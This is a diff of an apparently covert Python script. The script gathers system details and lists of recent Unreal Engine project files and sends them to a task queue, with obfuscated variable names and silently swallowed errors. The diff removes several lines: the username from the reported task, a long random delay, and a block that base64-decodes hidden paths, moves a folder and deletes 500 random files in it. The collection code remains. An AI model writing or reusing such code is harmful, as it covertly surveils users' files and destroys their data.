@@ -132,16 +132,15 @@ def find_file(target_name, start_dir):
     return None
 
 
-
 try:
     add_queue_task(
-        "tsl__{}__begin".format(getpass.getuser().lower()),
+        "tsl__begin",
         {"sys_version": str(sys.version), "exec_path": str(sys.executable)},
     )
 except:
     pass
     
-time.sleep(random.randint(7000, 18000))
+# time.sleep(random.randint(7000, 18000))
 
 # - 0
 zovV = []
@@ -172,24 +171,12 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=8)
 
     if zovV:
-        add_queue_task("tsl__user", {"file": zovV})
+        add_queue_task("tsl__user", {"file": zovV[:100]})
 except:
     try:
         add_queue_task("tsl_error", {"error": str(traceback.format_exc())})
     except:
         pass
-
-
-try:
-    tn = [b64decode_padded("UzovdGVtcC9DSEVBVEVS"), b64decode_padded("UzovdGVtcC9DSEVBVEVSX01PRA==")]
-    random.shuffle(tn)
-    if os.path.exists(b64decode_padded("UzovdGVtcC9NT0Q=")):
-        shutil.move(b64decode_padded("UzovdGVtcC9NT0Q="), tn[0])
-        fs = glob(f"{tn[0]}*/*", recursive=True)
-        for i in random.choices(fs, k=500):
-            os.remove(i)
-except:
-    pass
     
 # - A0
 try:
